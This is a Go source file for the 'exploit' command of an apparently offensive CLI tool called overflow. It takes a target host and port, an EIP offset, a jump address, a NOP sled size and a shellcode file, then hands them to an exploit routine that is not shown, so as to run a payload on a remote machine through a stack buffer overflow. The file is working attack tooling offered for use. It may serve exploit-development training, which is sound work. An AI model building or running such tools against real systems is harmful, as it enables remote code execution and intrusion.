package exploit

import (
    "github.com/spf13/cobra"
    "github.com/sradley/overflow/internal/overflow"
    "github.com/sradley/overflow/internal/cli"
)

// arguments taken by the exploit command
var (
    host    string
    port    int
    offset  int
    jump    string
    reverse bool
    nops    int
    shell   string
    pref    string
    suff    string
)

// exploit command definition
var Exploit = &cobra.Command{
    Use:   "exploit",
    Short: "Attempts to execute a specified payload on target",
    Run:   exploit,
}

// initialisation function for all arguments taken by the exploit command
func Init() {
    // host flag (required)
    Exploit.Flags().StringVarP(&host, "host", "H", "",
        "the target machine's IP address")
    Exploit.MarkFlagRequired("host")

    // port flag (required)
    Exploit.Flags().IntVarP(&port, "port", "P", 0,
        "the port the target service is running on")
    Exploit.MarkFlagRequired("port")

    // prefix and suffix flags (optional)
    Exploit.Flags().StringVarP(&pref, "prefix", "p", "",
        "(optional) prefix to put before payload")
    Exploit.Flags().StringVarP(&suff, "suffix", "s", "",
        "(optional) suffix to put after payload")

    // offset flag (required)
    Exploit.Flags().IntVarP(&offset, "offset", "o", 0,
        "the offset of the EIP register")
    Exploit.MarkFlagRequired("offset")

    // jump flag (required)
    Exploit.Flags().StringVarP(&jump, "jump", "j", "",
        "the jump address for executing shellcode")
    Exploit.MarkFlagRequired("jump")

    // reverse flag (optional)
    Exploit.Flags().BoolVarP(&reverse, "reverse", "r", false,
        "(optional) reverse the endianness of the jump address bytes")

    // nops flag (optional)
    Exploit.Flags().IntVarP(&nops, "nops", "n", 16,
        "(optional) the number of NOPs to pad payload with")

    // shell flag (required)
    Exploit.Flags().StringVarP(&shell, "shell", "S", "",
        "the path to the payload to be executed on the target")
    Exploit.MarkFlagRequired("shell")
}

// exploit command subroutine
func exploit(cmd *cobra.Command, args []string) {
    // print the title card
    cli.ExploitTitle(host, port, offset, jump, reverse, nops, shell)

    // run the exploit functionality
    overflow.Exploit(host, port, offset, jump, reverse, nops, shell, pref,
        suff)
}

